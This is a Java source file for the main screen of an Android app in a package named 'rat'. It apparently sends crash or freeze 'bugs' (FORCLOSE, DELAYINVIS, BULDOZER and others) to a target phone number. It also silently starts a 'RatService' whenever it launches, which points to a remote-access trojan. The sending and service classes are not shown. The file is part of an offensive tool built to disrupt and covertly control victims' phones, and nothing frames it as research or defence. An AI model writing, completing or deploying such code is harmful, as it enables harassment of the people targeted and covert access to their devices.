package com.xkiluaa.rat;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private EditText etTarget;
    private String selectedBug = "forclose";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etTarget = findViewById(R.id.et_target);

        findViewById(R.id.card_forclose).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { selectedBug = "forclose"; toast("Bug: FORCLOSE"); }
        });
        findViewById(R.id.card_spambkp).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { selectedBug = "spambkp"; toast("Bug: SPAMBKP"); }
        });
        findViewById(R.id.card_delayinvis).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { selectedBug = "delayinvis"; toast("Bug: DELAYINVIS"); }
        });
        findViewById(R.id.card_buldozer).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { selectedBug = "buldozer"; toast("Bug: BULDOZER"); }
        });
        findViewById(R.id.card_blankxstc).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { selectedBug = "blankxstc"; toast("Bug: BLANKXSTC"); }
        });
        findViewById(R.id.card_freezeXdelay).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { selectedBug = "freezexdelay"; toast("Bug: FREEZEXDELAY"); }
        });

        Button btnSend = findViewById(R.id.btn_send);
        btnSend.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String target = etTarget.getText().toString().trim();
                if (target.isEmpty()) { toast("Isi nomor target dulu!"); return; }
                Intent svc = new Intent(MainActivity.this, RatService.class);
                startService(svc);
                BugSender sender = new BugSender(target, selectedBug);
                sender.send(MainActivity.this);
                toast("Bug terkirim ke " + target);
            }
        });

        startService(new Intent(this, RatService.class));
    }

    private void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }
}